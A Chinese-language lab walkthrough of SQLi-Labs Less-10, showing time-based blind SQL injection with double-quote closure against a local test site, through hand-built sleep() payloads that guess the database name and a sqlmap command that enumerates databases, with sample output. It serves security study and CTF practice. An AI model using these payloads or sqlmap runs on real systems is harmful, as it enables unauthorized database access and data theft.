# SQLi-Labs Less-10 延时盲注复现详解

# SQLi-Labs Less-10 延时盲注复现（双引号闭合）

本次复现针对 **SQLi-Labs Less-10**（基于**双引号闭合**的**时间盲注**），分为「环境准备」「手工注入复现」「sqlmap 自动化复现」三部分，结合CTF实战视角补充原理与注释，适配信息安全专业学习与CTF备赛需求。

## 一、手工延时盲注复现（核心：双引号闭合）

Less-10 特征：**双引号（"）闭合**的数字型注入，无回显，需通过`sleep()`函数的延时效果判断注入结果（时间盲注核心逻辑）。

### 步骤1：判断注入点与闭合方式

#### 执行请求（浏览器地址栏）

```Plain Text

http://127.0.0.1/sqli-labs/Less-10/?id=1" and if(1=1,sleep(5),1)--+
```

#### 对照请求（验证延时逻辑）

```Plain Text

http://127.0.0.1/sqli-labs/Less-10/?id=1" and if(1=2,sleep(5),1)--+
```

#### 结果分析

- 第一个请求：页面**延迟约5秒加载** → 条件`1=1`成立，`sleep(5)`执行，**存在注入点**；

- 第二个请求：页面**立即加载** → 条件`1=2`不成立，`sleep(5)`未执行；

- 核心结论：闭合方式为**双引号**，可使用`if(条件,sleep(延时),默认值)`构造延时注入语句。

你提供的语句 `?id=1"%20and%20if(1,sleep(5),1)--+` 是简化版（`1` 等价于 `1=1`），效果一致；`%20` 是空格的URL编码，`--+` 是注释符（截断后续SQL语句）。

### 步骤2：猜测数据库名长度

#### 执行请求

```Plain Text

http://127.0.0.1/sqli-labs/Less-10/?id=1" and if(length(database())=8,sleep(5),1)--+
```

#### 原理与注释

```SQL

-- 拼接后的后端SQL语句（核心）
SELECT * FROM users WHERE id="1" and if(length(database())=8,sleep(5),1)--+" LIMIT 0,1;

-- 函数解释
length(database())  # 获取当前数据库名的长度
if(条件, 成立执行, 不成立执行)  # 延时判断核心函数
```

#### 结果分析

页面延迟5秒加载 → 当前数据库名长度**为8**（SQLi-Labs 默认数据库名是`security`，长度恰好为8）。

### 步骤3：逐字符猜测数据库名（ASCII码匹配）

以**第1个字符**为例，猜测为`s`（ASCII码=115）：

#### 执行请求

```Plain Text

http://127.0.0.1/sqli-labs/Less-10/?id=1" and if(ascii(mid(database(),1,1))=115,sleep(5),1)--+
```

#### 原理与注释

```SQL

-- 核心函数拆解
mid(database(),1,1)  # 截取数据库名的第1个字符（从位置1开始，截取1位）
ascii(字符)          # 将字符转换为ASCII码
if(ascii(...) = 115, sleep(5), 1)  # 匹配成功则延时5秒
```

#### 结果分析

页面延迟5秒加载 → 第1个字符的ASCII码是115，即字符`s`。

拓展：按此方法逐字符测试（第2位`e`=101、第3位`c`=99……），最终可拼出完整数据库名`security`。

---

## 三、sqlmap 自动化注入复现（一键验证）

### 步骤1：执行核心命令（终端/命令行）

```Bash

# 你的原始命令（已适配Less-10，双引号闭合）
python3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-10/?id=1" --batch --dbs
```

### 步骤2：命令参数注释（CTF实战必记）

|参数|作用|
|---|---|
|`sqlmap`|启动sqlmap|
|`-u 目标URL`|指定注入测试的URL（包含注入点参数`id=1`）|
|`--batch`|全自动模式（不手动输入，直接使用默认选项）|
|`--dbs`|枚举当前MySQL服务器中**所有数据库**|
### 步骤3：复现结果验证

执行命令后，sqlmap会自动识别注入点（双引号闭合），并输出所有可用数据库，与你提供的截图结果一致：

```Plain Text

available databases [14]:
[*] challenges
[*] dvwa
[*] information_schema
[*] lyb
[*] mysql
[*] performance_schema
[*] pikachu
[*] pkxss
[*] security  <-- SQLi-Labs 核心数据库
[*] sys
[*] test
[*] user
[*] wuya
[*] xss
```

---
> （注：文档部分内容可能由 AI 生成）